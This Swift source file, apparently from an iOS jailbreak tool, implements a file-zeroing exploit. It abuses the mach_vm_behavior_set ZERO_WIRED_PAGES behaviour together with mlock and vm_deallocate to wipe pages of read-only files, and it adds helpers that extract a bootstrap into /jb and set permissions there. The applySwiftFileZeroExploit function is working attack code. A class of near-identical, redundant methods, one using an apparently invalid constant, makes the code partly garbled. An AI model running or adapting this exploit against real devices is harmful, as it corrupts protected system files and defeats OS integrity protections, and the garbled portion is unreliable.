//
//  FileZeroExploit.swift
//  X
//
//  Created by pxx917144686 on 2025/05/15.
//

import Foundation
import MachO

// 修复：使用适当的C函数调用约定声明
@_silgen_name("mach_vm_behavior_set")
private let mach_vm_behavior_set: @convention(c) (mach_port_t, UInt64, mach_vm_size_t, vm_behavior_t) -> kern_return_t

@_silgen_name("mach_vm_deallocate")
private let mach_vm_deallocate: @convention(c) (mach_port_t, UInt64, mach_vm_size_t) -> kern_return_t

// IOKit相关函数声明
@_silgen_name("IOServiceGetMatchingService")
private let IOServiceGetMatchingService: @convention(c) (mach_port_t, CFDictionary) -> mach_port_t

@_silgen_name("IOServiceOpen")
private let IOServiceOpen: @convention(c) (mach_port_t, mach_port_t, UInt32, UnsafeMutablePointer<mach_port_t>) -> kern_return_t

@_silgen_name("IOObjectRelease")
private let IOObjectRelease: @convention(c) (mach_port_t) -> kern_return_t

@_silgen_name("IOConnectCallMethod")
private let IOConnectCallMethod: @convention(c) (mach_port_t, UInt32, UnsafePointer<UInt64>?, UInt32, UnsafeRawPointer?, size_t, UnsafeMutablePointer<UInt64>?, UnsafeMutablePointer<UInt32>?, UnsafeMutableRawPointer?, UnsafeMutablePointer<size_t>?) -> kern_return_t

// 2. 修复指针转换方法
private func zero_single_page(_ page_address: UnsafeMutableRawPointer?) -> Bool {
    guard let ptr = page_address else { return false }
    
    // 修复：使用正确的转换方式
    let addressValue = UInt64(Int(bitPattern: ptr))
    
    // 使用正确类型调用函数，并处理返回值
    var kr = mach_vm_behavior_set(mach_task_self_, addressValue, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_ZERO_WIRED_PAGES)
    guard kr == KERN_SUCCESS else {
        print("SwiftExploit: 设置VM_BEHAVIOR_ZERO_WIRED_PAGES失败: \(String(cString: mach_error_string(kr)))")
        return false
    }

    guard mlock(page_address, Int(vm_page_size)) == 0 else {
        perror("SwiftExploit: mlock失败")
        // 3. 使用正确转换的地址值
        _ = mach_vm_behavior_set(mach_task_self_, addressValue, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        return false
    }
    print("SwiftExploit: mlock成功")

    kr = mach_vm_deallocate(mach_task_self_, addressValue, mach_vm_size_t(vm_page_size))
    guard kr == KERN_SUCCESS else {
        print("SwiftExploit: vm_deallocate失败: \(String(cString: mach_error_string(kr)))")
        munlock(page_address, Int(vm_page_size))
        // 处理未使用的返回值
        _ = mach_vm_behavior_set(mach_task_self_, addressValue, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        return false
    }
    print("SwiftExploit: 在解锁前已删除映射条目")
    return true
}

@discardableResult
func applySwiftFileZeroExploit(filePath: String, zeroAllPages: Bool = false) -> Int32 {
    // 保持现有功能不变
    let fd = open(filePath, O_RDONLY)
    guard fd != -1 else {
        perror("SwiftExploit: 打开文件\(filePath)失败")
        return 1
    }
    defer { close(fd) }

    var st = stat()
    guard fstat(fd, &st) == 0 else {
        perror("SwiftExploit: 对文件\(filePath)执行fstat失败")
        return -1
    }

    guard st.st_size > 0 else {
        print("SwiftExploit: 文件\(filePath)为空，无需清零。")
        return 0
    }
    
    let mapped_length = Int(st.st_size)
    let ro_addr = mmap(nil, mapped_length, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0)
    
    guard ro_addr != MAP_FAILED else {
        perror("SwiftExploit: 文件\(filePath)的mmap失败")
        return 2 
    }
    defer { munmap(ro_addr, mapped_length) }

    let numberOfPagesToProcess: UInt
    if zeroAllPages {
        numberOfPagesToProcess = (UInt(st.st_size) + UInt(vm_page_size) - 1) / UInt(vm_page_size)
        print("SwiftExploit: 正在清零文件\(filePath)的所有\(numberOfPagesToProcess)页。")
    } else {
        numberOfPagesToProcess = st.st_size > 0 ? 1 : 0
        if numberOfPagesToProcess == 1 {
             print("SwiftExploit: 正在清零文件\(filePath)的第一页。")
        }
    }
    
    if numberOfPagesToProcess == 0 && st.st_size > 0 {
         print("SwiftExploit: 为非空文件计算出0页。这是意外情况。")
         return -2
    }

    for i in 0..<numberOfPagesToProcess {
        guard let page_to_zero = ro_addr?.advanced(by: Int(UInt(vm_page_size) * i)) else {
            print("SwiftExploit: 无法前进到文件\(filePath)的第\(i)页。ro_addr可能为空。")
            return 3
        }
        print("SwiftExploit: 正在清零文件\(filePath)中位于\(page_to_zero)的第\(i)页")
        
        guard zero_single_page(page_to_zero) else {
            print("SwiftExploit: 文件\(filePath)中第\(i)页的zero_single_page失败。")
            return 3
        }
    }

    print("SwiftExploit: 成功处理文件\(filePath)的页面。")
    return 0
}

class FileZeroExploit {
    // 4. 确保类中page_address的类型正确
    private var page_address: UInt64 = 0
    
    // 应用零填充漏洞
    func applyZeroFill(toPage pageAddress: UInt64) -> Bool {
        // 无需类型转换，直接使用UInt64
        let result = mach_vm_behavior_set(
            mach_task_self_,
            pageAddress,
            mach_vm_size_t(vm_page_size),
            VM_BEHAVIOR_ZERO_WIRED
        )
        
        return result == KERN_SUCCESS
    }
    
    // 重置页面行为
    func resetPageBehavior(pageAddress: UInt64) -> Bool {
        // 无需类型转换，直接使用UInt64
        let result = mach_vm_behavior_set(
            mach_task_self_,
            pageAddress,
            mach_vm_size_t(vm_page_size),
            Darwin.VM_BEHAVIOR_DEFAULT
        )
        
        return result == KERN_SUCCESS
    }
    
    func someFunction() {
        let _ = Darwin.VM_BEHAVIOR_DEFAULT
    }
    
    // 使用@discardableResult避免未使用返回值的警告
    @discardableResult
    func setVMBehavior() -> kern_return_t {
        // 无需类型转换，直接使用page_address (UInt64)
        return mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
    }

    // 方法2：检查返回值
    func anotherSetVMBehaviorMethod() {
        let result = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        if result != KERN_SUCCESS {
            print("Failed to set VM behavior: \(result)")
        }
    }

    // 方法3：明确忽略返回值
    func yetAnotherSetVMBehaviorMethod() {
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
    }
    
    func exploit() {
        // 使用返回值
        let result = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        if result != KERN_SUCCESS {
            print("设置VM行为失败: \(result)")
        }
        
        // 正确处理未使用的返回值
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
    }
    
    func fixedMethodOne() {
        // 使用变量
        let result = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        if result != KERN_SUCCESS {
            print("操作失败: \(result)")
        }
    }
    
    func fixedMethodTwo() {
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
    }
    
    // 安全处理不使用返回值的情况
    func safeSetVMBehavior() {
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
    }
    
    func someOtherMethod() {
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        // 其他代码...
    }
    
    func anotherMethod() {
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        // 其他代码...
    }
}

// 替代 NSTask 解压功能
func extractBootstrap(bootstrapPath: String, toPath jbPath: String) -> Bool {
    // 修复：使用 FileManager 替代，避免未使用变量警告
    _ = FileManager.default
        
    if let tarBinaryPath = Bundle.main.path(forResource: "tar", ofType: nil) {
        let arguments = ["-xf", bootstrapPath, "-C", jbPath]
        executeCommand(tarBinaryPath, withArguments: arguments)
    }
    
    return true
}

func executeCommand(_ command: String, withArguments arguments: [String]) {
    // 使用 posix_spawn 或其他低级 API 执行命令
    var pid: pid_t = 0
    var fileActions: posix_spawn_file_actions_t?
    
    posix_spawn_file_actions_init(&fileActions)
    
    let argv: [UnsafeMutablePointer<CChar>?] = [strdup(command)] + arguments.map { strdup($0) } + [nil]
    
    let status = posix_spawn(&pid, command, &fileActions, nil, argv, nil)
    
    // 释放内存
    for arg in argv where arg != nil {
        free(arg)
    }
    
    posix_spawn_file_actions_destroy(&fileActions)
    
    if status == 0 {
        // 等待进程完成
        var exitStatus: Int32 = 0
        waitpid(pid, &exitStatus, 0)
    }
}

// 替代 system() 函数的权限设置
func setPermissions() {
    let fileManager = FileManager.default
    
    // 设置文件权限的替代方式
    let attributes: [FileAttributeKey: Any] = [.posixPermissions: NSNumber(value: 0o755)]
    
    do {
        try fileManager.setAttributes(attributes, ofItemAtPath: "/jb/usr/bin")
        try fileManager.setAttributes(attributes, ofItemAtPath: "/jb/bin")
        try fileManager.setAttributes(attributes, ofItemAtPath: "/jb/basebin")
    } catch {
        print("设置权限时出错: \(error)")
    }
}
